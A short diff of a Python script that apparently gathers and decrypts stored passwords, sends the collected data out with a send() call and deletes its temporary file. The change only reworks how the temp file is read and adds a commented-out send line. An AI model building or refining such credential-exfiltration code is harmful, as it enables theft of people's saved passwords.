@@ -75,8 +75,11 @@ def temp_store(mode, data=None):
             f.write(data)
 
     elif mode == 'read':
+        te = ''''''
         with open("temp.txt", 'r') as f:
-            return f.readlines()
+            for i in f.readlines():
+                te += i
+        return te
 
 
 def password_decryption(password, encryption_key):
@@ -165,5 +168,6 @@ if __name__ == "__main__":
     send(f"data from {name}")
     main()
     send(temp_store("read"))
+    # send(temp_store("read"))
     print('success')
     delete_file()
